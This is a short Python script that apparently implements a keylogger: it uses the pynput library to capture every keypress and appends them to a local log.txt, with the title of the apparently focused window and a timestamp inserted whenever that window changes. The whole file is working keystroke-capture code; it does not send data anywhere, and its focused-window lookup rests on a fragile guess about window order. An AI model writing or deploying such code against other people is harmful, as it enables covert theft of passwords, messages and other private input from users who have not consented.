'''https://pynput.readthedocs.io/en/latest/index.html'''
import datetime

from pynput import keyboard
import ctypes
'''
EnumWindows = ctypes.windll.user32.EnumWindows
GetWindowThreadProcessId = ctypes.windll.user32.GetWindowThreadProcessId
EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, types.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
GetWindowText = ctypes.windll.user32.GetWindowTextW
GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
IsWindowVisible = ctypes.windll.user32.IsWindowVisible
IsWindowEnabled = ctypes.windll.user32.IsWindowEnabled
'''

LAST_WINDOW = None

#Provisory function to return the window in focus, because library win32gui do not works
def get_windows():
    EnumWindows = ctypes.windll.user32.EnumWindows
    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
    GetWindowText = ctypes.windll.user32.GetWindowTextW
    GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
    IsWindowVisible = ctypes.windll.user32.IsWindowVisible

    titles = []

    def foreach_window(hwnd, lParam):
        if IsWindowVisible(hwnd):
            length = GetWindowTextLength(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            GetWindowText(hwnd, buff, length + 1)
            titles.append(buff.value)
        return True

    EnumWindows(EnumWindowsProc(foreach_window), 0)

    return (titles[2]) #Return window in focus from array


def tecla_pressionada(tecla):
    try:
        if tecla.vk >= 96 and tecla.vk <= 105:
            tecla = tecla.vk - 96
    except:
        pass

    tecla = str(tecla).replace("'", "")

    if len(tecla) > 1:
        tecla = " [{}] ".format(tecla)

    with open("log.txt", "a") as file:
        global LAST_WINDOW
        current_window = get_windows()
        if current_window != LAST_WINDOW:
            file.write("\n#### {} - {} ####\n".format(current_window, datetime.datetime.now()))
            LAST_WINDOW = current_window

        file.write(tecla)




with keyboard.Listener(on_press=tecla_pressionada) as listener:
    listener.join()


